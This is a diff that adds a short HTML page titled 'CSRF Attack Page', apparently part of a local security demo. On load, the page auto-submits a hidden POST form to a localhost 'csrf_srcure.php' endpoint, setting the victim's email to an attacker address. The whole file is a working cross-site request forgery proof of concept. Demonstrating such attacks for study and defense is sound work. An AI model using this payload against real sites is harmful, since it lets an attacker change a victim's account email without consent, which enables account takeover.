@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h3>CSRF Attack Page</h3>
+
+<form action="http://localhost/security-demo/csrf_srcure.php" method="POST">
+    <input type="hidden" name="email" value="hacker@gmail.com">
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+
+</body>
+</html>
